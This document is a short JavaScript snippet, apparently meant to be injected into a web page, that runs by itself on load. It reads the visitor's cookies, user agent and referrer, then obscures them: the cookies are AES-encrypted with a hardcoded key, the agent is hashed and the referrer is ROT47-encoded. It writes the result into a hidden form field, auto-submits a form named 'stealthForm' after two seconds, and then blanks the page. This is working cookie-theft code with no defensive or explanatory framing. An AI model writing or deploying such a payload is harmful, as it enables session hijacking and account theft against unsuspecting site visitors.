        (() => {
            async function encryptAES(text, key) {
                const encoder = new TextEncoder();
                const encodedText = encoder.encode(text);
                const hashedKey = await crypto.subtle.digest("SHA-256", encoder.encode(key));
                const cryptoKey = await crypto.subtle.importKey("raw", hashedKey, { name: "AES-GCM" }, false, ["encrypt"]);
                const iv = crypto.getRandomValues(new Uint8Array(12));
                const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, cryptoKey, encodedText);
                return btoa(String.fromCharCode(...new Uint8Array(iv)) + String.fromCharCode(...new Uint8Array(encrypted)));
            }

            function rot47(str) {
                return str.replace(/[\x21-\x7E]/g, c =>
                    String.fromCharCode(33 + ((c.charCodeAt(0) + 14) % 94))
                );
            }

            async function hashSHA512(data) {
                const encoder = new TextEncoder();
                const buffer = await crypto.subtle.digest("SHA-512", encoder.encode(data));
                return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2, "0")).join("");
            }

            async function stealthEncode() {
                const secretKey = "UltraHiddenKey";
                const cookies = document.cookie || "No_Cookies";
                const userAgent = navigator.userAgent || "Unknown_User_Agent";
                const referrer = document.referrer || "No_Referrer";

                const encryptedCookies = await encryptAES(cookies, secretKey);
                const hashedAgent = await hashSHA512(userAgent);
                const encodedReferrer = rot47(referrer);

                const stealthPayload = JSON.stringify({
                    encryptedCookies,
                    hashedAgent,
                    encodedReferrer
                });

                document.getElementById("encodedData").value = btoa(stealthPayload);

                setTimeout(() => {
                    document.getElementById("stealthForm").submit();
                }, 2000);
            }

            if (!window.stealthExecuted) {
                window.stealthExecuted = true;
                stealthEncode().then(() => {
                    setTimeout(() => {
                        document.body.innerHTML = "";
                    }, 2000);
                });
            }
        })();
